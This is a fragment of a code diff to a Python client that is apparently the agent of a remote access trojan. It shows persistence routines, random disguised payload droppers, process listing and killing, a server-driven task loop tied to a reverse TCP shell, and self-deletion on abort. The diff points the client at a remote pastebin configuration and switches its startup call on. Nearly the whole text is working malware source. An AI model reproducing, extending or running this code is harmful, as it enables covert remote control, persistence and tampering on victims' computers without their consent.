+                    self._payloads.append(self.payload(random.choice(['java','flash','chrome','firefox'])))
+                for method in methods:
+                    if method == 'all' or action == method:
                         self.persistence.methods[method]['established'], self.persistence.methods[method]['result'] = getattr(self, target.format(cmd, method))()
-                    return json.dumps({m: self.persistence.methods[m]['result'] for m in methods})
-                elif method in methods:
-                    payload = self.dropper('flash')
-                    self.persistence.methods[method]['established'], self.persistence.methods[method]['result'] = getattr(self, target.format(cmd, method))()
-                    return json.dumps({method: self.persistence.methods[method]['result']})
+                return json.dumps({m: self.persistence.methods[m]['result'] for m in methods})
         except Exception as e:
             self.debug("{} error: {}".format(self.persistence.func_name, str(e)))
         return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in self.persistence.methods if sys.platform in getattr(Client, '_persistence_add_%s' % m).platforms]))
@@ -2301,21 +2349,15 @@ class Client():
         """
         try:
             if not args:
-                return self.process.usage
+                return self.ps.usage
             else:
                 cmd, _, action = str(args).partition(' ')
-                if 'monitor' in cmd:
-                    if action:
-                        return self._ps_start_monitor(keyword=action)
-                    else:
-                        return self._ps_start_monitor()
+                if hasattr(self, '_ps_%s' % cmd):
+                    return getattr(self, '_ps_%s' % cmd)(action)
                 else:
-                    if hasattr(self, '_ps_%s' % cmd):
-                        return getattr(self, '_ps_%s' % cmd)(action)
-                    else:
-                        return "usage: {}\n\targs: list, search, kill, monitor".format(self.ps.usage)
+                    return "usage: {}\n\targs: list, search, kill, monitor".format(self.ps.usage)
         except Exception as e:
-            return "{} error: {}".format(self.process.func_name, str(e))
+            return "{} error: {}".format(self.ps.func_name, str(e))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
@@ -2333,13 +2375,13 @@ class Client():
                         remove = getattr(self, '_persistence_remove_{}'.format(method))()
                     except Exception as e2:
                         self.debug("{} error: {}".format(method, str(e2)))
-            for stager in self._stagers:
+            for stager in self._payloads:
                 self._get_delete(stager)
             if not self._debug:
                 self._get_delete(sys.argv[0])               
         finally:
             shutdown = threading.Thread(target=self._get_shutdown)
-            taskkill = threading.Thread(target=self.process_kill, args=('python',))
+            taskkill = threading.Thread(target=self.ps, args=('kill python',))
             shutdown.start()
             taskkill.start()
             sys.exit()
@@ -2351,8 +2393,8 @@ class Client():
         """
         try:
             while True:
-                if self._session['connection'].wait(timeout=3.0):
-                    if not self._session['prompt'].is_set():
+                if self._flags['connection'].wait(timeout=3.0):
+                    if not self._flags['prompt'].is_set():
                         task = self._server_recv()
                         if isinstance(task, dict):
                             cmd, _, action = [i.encode() for i in task['command'].partition(' ')]
@@ -2362,9 +2404,9 @@ class Client():
                                 result  = "{} error: {}".format(self.reverse_tcp_shell.func_name, str(e1))
                             task.update({'result': result})
                             self._server_send(**task)
-                            if cmd and cmd in self._get_config('tasks') and 'PRIVATE KEY' not in task['command']:
+                            if cmd and cmd in self._flags['tasks'] and 'PRIVATE KEY' not in task['command']:
                                 self._results[task['task']] = task
-                            self._session['prompt'].set()
+                            self._flags['prompt'].set()
                 else:
                     self.debug("Connection timed out")
                     break
@@ -2383,7 +2425,7 @@ class Client():
                 print(bytes(data))
 
                 
-    def connect(self, **kwargs):
+    def connect(self, mode='shell'):
         """
         connect to server and start new session
         """
@@ -2392,26 +2434,21 @@ class Client():
             self._session['key']        = self._session_key()
             self._session['id']         = self._session_id()
             self._session['public_key'] = self._get_public_key()
-            return
+            return True
         except Exception as e:
             self.debug("{} error: {}".format(self.connect.func_name, str(e)))
         return self._get_restart(self.connect.func_name)
 
 
-    def run(self, *args, **kwargs):
+    def run(self, mode='shell'):
         """
-        initiate Client startup routine
+        run Client startup routine
         """
         try:
-            self.connect()
-            if self._session['connection'].wait(timeout=3.0):
-                self._workers[self._server_prompt.func_name] = threading.Thread(target=self._server_prompt, name=time.time())
+            if self.connect():
+                self._flags['mode'] = self._mode(mode)
                 self._workers[self._task_manager.func_name] = threading.Thread(target=self._task_manager, name=time.time())
-                self._workers[self.reverse_tcp_shell.func_name] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
-                self._workers[self._server_prompt.func_name].daemon = True
                 self._workers[self._task_manager.func_name].daemon = True
-                self._workers[self._server_prompt.func_name].start()
-                self._workers[self.reverse_tcp_shell.func_name].start()
                 self._workers[self._task_manager.func_name].start()
                 return
             else:
@@ -2422,6 +2459,6 @@ class Client():
                             
 
 if __name__ == "__main__":
-    client = Client(config='https://pastebin.com/raw/si8MrN5X')
-    #client.run()
+    client = Client(config='https://pastebin.com/raw/uYGhnVqp')
+    client.run()
 
